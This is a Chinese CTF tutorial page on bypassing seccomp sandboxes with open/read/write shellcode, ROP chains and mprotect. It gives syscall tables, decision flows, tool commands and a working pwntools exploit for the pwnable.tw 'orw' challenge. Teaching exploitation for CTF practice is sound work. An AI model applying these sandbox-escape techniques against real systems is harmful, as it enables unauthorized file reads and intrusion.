# 沙箱绕过（seccomp / ORW）

关键词：seccomp seccomp-tools 沙箱 sandbox ORW open read write openat mprotect shellcode 系统调用 syscall execve 被禁 白名单 黑名单 32位 64位 pwn

## ① 识别指纹

- 二进制里出现 `seccomp` / `prctl` / `seccomp_init` / `seccomp_rule_add` 的字符串或导入符号
- 拿到 shell 后执行 `cat flag` 没有输出，进程直接退出；或者 `system("/bin/sh")` 一调用就被杀
- 题目名带 `orw` / `sandbox` / `seccomp` / `shellcode`，题干写“只允许 open/read/write”或“execve is forbidden”
- 程序把输入当代码执行：`mmap` 出 RWX 页、把输入 `read` 到可执行缓冲区后直接调用
- 程序是静态链接，导入函数很少，反汇编里能看到 `syscall`（64 位）或 `int 0x80`（32 位）
- `strings` 里出现 `/flag`、`/home/orw/flag`、`flag.txt` 等路径
- `strace -f ./pwn` 能看到一次 `prctl(PR_SET_NO_NEW_PRIVS, ...)` 或 `prctl(PR_SET_SECCOMP, ...)`
- `checksec` 显示 NX enabled，但程序自己把某段内存设成可执行；栈不可执行不影响 shellcode 题

## ② 考什么

- seccomp BPF 过滤器的白名单 / 黑名单，以及 `arch` 检查
- `seccomp-tools dump ./pwn` 读过滤器，确认哪些 syscall 返回 `ALLOW`、哪些返回 `KILL` / `ERRNO`
- ORW 三段式：`open(path)` → `read(fd, buf, n)` → `write(1, buf, n)`
- 64 位 syscall 号：`open = 2`、`read = 0`、`write = 1`、`openat = 257`、`mprotect = 10`、`execve = 59`
- 32 位 syscall 号：`open = 5`、`read = 3`、`write = 4`、`openat = 295`、`mprotect = 125`、`execve = 11`
- 调用约定：64 位 `rax` 放号，`rdi / rsi / rdx / r10 / r8 / r9` 放参数；32 位 `eax` 放号，`ebx / ecx / edx / esi / edi / ebp` 放参数
- `openat(AT_FDCWD, path, flags)` 替代被禁的 `open`；`AT_FDCWD = -100`
- `mprotect(addr, len, 7)` 把内存改成可读可写可执行，再跳 shellcode
- shellcode 与 ROP 两种实现；静态链接时可以用 `syscall; ret` gadget
- `execve` 被禁后无法拿常规 shell，只能直接读文件
- seccomp strict 模式只允许 `read` / `write` / `_exit` / `sigreturn`
- `open` 返回的 fd 不一定等于 3，要使用返回值

## ③ 判断流程

### ③-1 子类型分流

1. **先确认沙箱存在** → `strings` / `objdump -d` 找到 `prctl` / `seccomp`，或运行后 `execve` 被杀 → 有沙箱，跳到第 2 条；没有沙箱 → 本页不适用，回 [ROP 与 ret2libc](/pwn/rop-ret2libc)
2. **`seccomp-tools dump ./pwn`** → 能跑出过滤器，跳到第 3 条；跑不起来（缺 libc / 架构不对）→ 用 `strace -f` 看 `prctl` 参数，或把二进制放到同架构环境，仍不行就静态分析，跳到第 3 条
3. **读允许列表** → `execve` 在允许列表，沙箱不是障碍，正常 getshell → 结束；`execve` 被禁、`open` / `read` / `write` 或 `openat` 在允许列表 → 跳到第 4 条；只有 `read` / `write`、没有打开文件的 syscall → 跳到第 6 条
4. **判断代码执行形式** → 程序把输入当 shellcode 执行（RWX 页 / 可执行缓冲区）→ 转 ③-2 A 组第 1 条；只能 ROP（NX、没有 RWX）→ 转 B 组第 1 条；能调用 `mprotect` 但当前缓冲区不可执行 → 转 C 组第 1 条
5. **`open` 被禁但 `openat` 在允许列表** → 用 `openat(AT_FDCWD, path, 0)`，转 A 组第 6 条或 B 组第 6 条；两者都在 → 按代价低的 `open` 走，跳到第 4 条
6. **`open` / `openat` 都被禁** → 允许 `sendfile` / `splice` / `pread64`，就用对应 syscall 读已打开的 flag fd → 结束；这些也不允许 → 沙箱下读不到文件，回第 1 条重新确认题干与 flag 位置
7. **以上都不成立** → 回第 1 条，用 `seccomp-tools dump` 只提取返回 `ALLOW` 的 syscall 号，逐个查 syscall 表 → 结束；仍读不懂 → 用 `strace` 逐个试 syscall，记录哪个被 `KILL` → 结束

### ③-2 成本排序链

**A. shellcode ORW**

1. **确认 shellcode 缓冲区可执行** → `vmmap` 看目标地址是 `rwx`，或程序把输入读进可执行段 → 可执行，跳到第 2 条；不可执行，转 C 组第 1 条
2. **64 位 open** → `rax = 2`，`rdi = path`，`rsi = 0`，`rdx = 0`，`syscall`；返回的 fd 在 `rax` → 跳到第 3 条
3. **64 位 read** → 先把 fd 移到 `rdi`（`mov rdi, rax`），再设 `rax = 0`、`rsi = buf`、`rdx = 0x100`，`syscall` → 跳到第 4 条
4. **64 位 write** → `rax = 1`，`rdi = 1`，`rsi = buf`，`rdx = 0x100`，`syscall` → 结束
5. **32 位版本** → `eax = 5` / `3` / `4`，参数放 `ebx` / `ecx` / `edx`，用 `int 0x80`；open 后把 `eax` 移到 `ebx` → 结束
6. **open 被禁、openat 在** → 64 位 `rax = 257`、`rdi = -100`、`rsi = path`、`rdx = 0`，回到第 3 条；32 位 `eax = 295`、`ebx = -100`、`ecx = path`、`edx = 0`，回到第 5 条
7. **路径字符串没地方放** → 把 `/flag\x00` 压栈或用 `lea rdi, [rip+...]` 指向 shellcode 尾部；字符串里有 `\x00` 被输入函数截断，就换一个可写地址先写入 → 回到第 2 条
8. **shellcode 含 `\x00` 被截断** → 用 `shellcraft` 生成无零版本，或改用 ROP → 转 B 组第 1 条
9. **以上都不成立** → 回 ③-1 第 4 条，换一种代码执行形式

**B. ROP ORW**

1. **找 gadget** → `pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret`（或 `ret2csu`）→ 三个都齐，跳到第 2 条；缺 `pop rdx`，用 `ret2csu` 或 libc 里的组合，跳到第 2 条；连 `syscall` gadget 都没有 → 回 ③-1 第 4 条改用 shellcode
2. **找可写缓冲区** → `readelf -S` 看 `.bss` 地址，或 `elf.bss()`；没有可写段 → 用栈地址（需要泄露）→ 进入第 3 条
3. **调 open / openat** → 64 位 `open@plt(path, 0)`，或 `syscall` gadget；把返回值 `rax` 移到 `rdi`（`mov rdi, rax; ...` gadget）→ 进入第 4 条
4. **调 read** → `read@plt(fd, buf, 0x100)`；fd 用上一步的 `rax`，或写死 `3`（确认 0/1/2 已占用）→ 进入第 5 条
5. **调 write** → `write@plt(1, buf, 0x100)` → 结束
6. **open 被禁** → 换成 `openat(AT_FDCWD = -100, path, 0)`；64 位号 `257`，32 位号 `295` → 回到第 3 条
7. **64 位栈对齐** → 调用 libc 函数前多塞一个 `ret`，否则 `movaps` 崩 → 回到第 3 条
8. **以上都不成立** → 转 C 组，或回 [ROP 与 ret2libc](/pwn/rop-ret2libc) 重新找 gadget

**C. mprotect 后再执行 shellcode**

1. **确认 `mprotect` 在允许列表** → 64 位号 `10`、32 位号 `125` 返回 `ALLOW` → 进入第 2 条；不在允许列表 → 回 A / B 组
2. **找页对齐的可写地址** → `.bss` / 堆 / 栈地址，满足 `addr & 0xfff == 0` → 进入第 3 条；地址不对齐，向下取整到页首，回到第 2 条
3. **ROP 调 mprotect** → `mprotect(addr, 0x1000, 7)`；64 位参数 `rdi / rsi / rdx`，32 位 `ebx / ecx / edx` → 进入第 4 条
4. **写入 shellcode** → 用 `read@plt(0, addr, 0x100)` 把 ORW shellcode 写到该页 → 进入第 5 条
5. **跳过去** → `jmp rsp` / `call rax` / `push addr; ret`，跳到 shellcode 起始地址 → 结束
6. **`mprotect` 返回失败** → 地址没对齐、长度没按页取整、或 sandbox 过滤了 `PROT_EXEC` → 回第 2 条核对这些值；仍失败 → 回 B 组纯 ROP ORW
7. **以上都不成立** → 回 ③-1 第 4 条

## ④ 工具与命令

```bash
# 读 seccomp 过滤器（Ruby gem：gem install seccomp-tools）
seccomp-tools dump ./pwn
seccomp-tools disasm filter.bpf
```

```bash
# 没有 seccomp-tools 时，用 strace 看 prctl 与系统调用
strace -f -e trace=prctl,open,openat,read,write,execve ./pwn
```

```bash
# 查 syscall 号，避免把 32 位和 64 位混用
ausyscall x86_64 open
ausyscall x86_64 openat
ausyscall i386 open
ausyscall --dump | grep -E '\b(open|openat|read|write|execve|mprotect)\b'
```

```bash
objdump -d ./pwn | grep -E 'syscall|int.*0x80'
ROPgadget --binary ./pwn --only 'pop|ret' | grep -E 'pop rdi|pop rsi|pop rdx'
ropper --file ./pwn --search 'syscall'
checksec --file=./pwn
```

```python
from pwn import *
context(os='linux', arch='amd64')

# 64 位 ORW；open 的返回值就是 fd
sc  = shellcraft.open('/flag')
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)
payload = asm(sc)
```

```python
from pwn import *
context(os='linux', arch='i386')

# 32 位 ORW；open 的返回值在 eax
sc  = shellcraft.open('/home/orw/flag')
sc += shellcraft.read('eax', 'esp', 0x30)
sc += shellcraft.write(1, 'esp', 0x30)
payload = asm(sc)
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| `seccomp-tools dump` 里看到 `A == 0` 就以为是 open | 0 是 read，open 在 64 位是 2、32 位是 5 | 按架构查 syscall 号再下结论 |
| 32 位程序写了 64 位的 syscall 号 | 架构检查分支不同，号也不一样 | 32 位用 `5 / 3 / 4`，64 位用 `2 / 0 / 1` |
| `execve` 被禁后还调 `system("/bin/sh")` | `system` 内部要 fork + execve | 放弃 shell，直接 ORW 读文件 |
| `open` 被禁但 `openat` 可用 | 只查了 `open` 的号 | 用 `openat(AT_FDCWD = -100, path, 0)` |
| 硬编码 fd = 3 却读不到 | 程序已经占用了 0/1/2 之外的 fd | 用 open 的返回值，`mov rdi, rax` |
| shellcode 发过去被截断 | 输入函数用 `strcpy` / 字符串处理，遇 `\x00` 停止 | 生成无零 shellcode，或改用 `read` 输入 |
| `mprotect` 返回 `EINVAL` | 地址没页对齐，或长度没按页取整 | `addr & ~0xfff`，长度向上取整到 0x1000 |
| ROP 链在 `syscall` 后崩 | `syscall` 会破坏 `rcx` 和 `r11` | 链里不要依赖这两个寄存器 |
| 32 位 shellcode 用 `syscall` 指令 | 32 位要走 `int 0x80` | 按架构选指令与寄存器 |
| 静态链接找不到 `open@plt` | 静态二进制没有 PLT 入口 | 用 `syscall; ret` gadget 直接调 |
| 远程沙箱与本地不同 | 远程多禁了 `open` / `mprotect` | 以远程或附件里的过滤器为准 |
| `write` 输出乱码或多出字节 | 写入长度超过实际读到的字节数 | 用 read 的返回值作为 write 长度，或只写固定小长度 |

## ⑥ 例题

**题目**：pwnable.tw `orw`
**来源**：pwnable.tw（`chall.pwnable.tw:10001`）；BUUCTF 有复现

**题干**：Read the flag from `/home/orw/flag`. Only `open` `read` `write` are allowed. 程序先安装 seccomp，再读入最多 200 字节并执行。

**关键观察**：
- 32 位 ELF，NX enabled，Canary found；程序把输入读入可执行缓冲区（公开题解常写作 `0x0804A060`）后直接调用
- `seccomp-tools dump ./orw` 的过滤器允许 `open`、`read`、`write`、`exit`、`exit_group`、`sigreturn`、`rt_sigreturn`
- `execve` 被过滤器拒绝，所以 `shellcraft.sh()` 一定失败
- 目标路径是 `/home/orw/flag`，不是 `/flag`

**走了哪条链**：③-1 第 1 条（发现 seccomp）→ 第 2 条（dump）→ 第 3 条（execve 禁、open/read/write 开）→ 第 4 条（输入被当 shellcode 执行）→ ③-2 A 组第 1 条（确认缓冲区可执行）→ 第 5 条（32 位 open/read/write）。

**命令与输出**：

```text
$ seccomp-tools dump ./orw
# 输出是一串 BPF 指令；关键看允许分支（行号与寄存器值以实际输出为准）：
#   open(5)    -> ALLOW
#   read(3)    -> ALLOW
#   write(4)   -> ALLOW
#   execve(11) -> ERRNO
```

```python
from pwn import *

context(os='linux', arch='i386')
p = remote('chall.pwnable.tw', 10001)
p.recvuntil(b'shellcode:')

sc  = shellcraft.open('/home/orw/flag')
sc += shellcraft.read('eax', 'esp', 0x30)
sc += shellcraft.write(1, 'esp', 0x30)
sc += shellcraft.exit(0)

p.send(asm(sc))
print(p.recvall(timeout=3).decode(errors='replace'))
```

```text
flag{...}
```

**结果**：没有拿到 shell，但 stdout 直接打印了 flag 文件内容。这正是 ORW 与普通 getshell 的区别：**沙箱允许你读文件，不允许你执行程序**。

::: tip 64 位同型题
把 syscall 号换成 `open = 2`、`read = 0`、`write = 1`，参数换成 `rdi / rsi / rdx`；只允许 `openat` 时用 `rax = 257` 和 `rdi = -100`。flag 以原题平台为准，本页不固定具体字符串。
:::
